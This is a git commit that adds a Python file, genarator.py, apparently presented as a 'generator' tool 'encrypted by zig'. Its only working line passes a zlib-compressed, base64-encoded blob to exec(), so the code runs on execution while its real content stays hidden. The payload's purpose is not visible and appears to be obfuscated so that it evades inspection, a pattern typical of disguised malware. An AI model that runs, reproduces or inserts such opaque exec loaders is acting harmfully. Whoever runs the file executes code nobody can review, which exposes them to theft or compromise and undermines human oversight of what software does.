3491e5ac8b56def3580bd69d6392caa148a22925
seignuers <111926950+seignuers@users.noreply.github.com>
2022-09-09 03:36:21 +0530

    Create genarator.py

---
+++ genarator.py
@@ -0,0 +1,5 @@
+# encrypted by zig
+# tool created by roy and zig
+
+import zlib,base64
+exec(zlib.decompress(base64.b64decode("eJxNjU0Kg0AMhfc5RXDjDAUPILgp2O5ceAGZymhDnckQI7S3r9Zaugrvez+hkFgU02ugcfIKtOueJxYXHAzC4afw615YPAJEF3yFFNOiJju7GL1gs7Iys+Dmnqi7fWB1rBf76QaW4NRsfQtJKKr5zx9se1Nc27pu8IS53l18zLh2cZkpjsiLoDJPZW7BP0mNBXgDe/tIuQ==")))
